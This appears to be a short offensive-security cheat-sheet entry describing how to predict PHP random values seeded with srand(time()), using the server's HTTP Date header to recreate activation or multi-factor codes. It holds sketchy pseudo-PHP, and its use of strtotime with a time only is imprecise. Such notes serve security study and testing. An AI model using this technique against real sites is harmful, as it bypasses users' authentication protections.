# PHP Srand Time Abusing

If the website uses “srand(time())” to generate random strings in PHP, we can get the non-random strings by manipulating the attribute of the “srand()” function.

### Investigation <a href="#investigation" id="investigation"></a>

```shellscript
function generate_random_number() {
    srand(time());
    // Some code for generating random number...
    return random_numbers;
}
```

For example, assume website uses the above function that generates random numbers or strings to be used for authentications such as activation code, multi-factor security code.\
In such cases, we can replace the **“time()”** function with the **“strtotime()”** to make the result to be non-random.

### Exploitation <a href="#exploitation" id="exploitation"></a>

#### 1. Send Request <a href="#id-1-send-request" id="id-1-send-request"></a>

First off, send the request for executing the desired function e.g. **“generate\_random\_number”** that uses **“srand(time())”**.\
See the HTTP response header.

```shellscript
Date: Thu, 09 Mar 2023 08:31:35 GMT
```

We can get the time such as **“08:31:35”** so copy this.

#### 2. Generate Non-Random Result <a href="#id-2-generate-non-random-result" id="id-2-generate-non-random-result"></a>

We can insert the above Date time as the attribute of **“strtotime()”** function as follow.

```shellscript
function generate_random_number() {
    srand(strtotime("08:31:35"));
    // Some code for generating random number...
    echo random_numbers;
}
```

Now execute the above function in PHP playground.\
We can get the same result no matter how many times we run it.
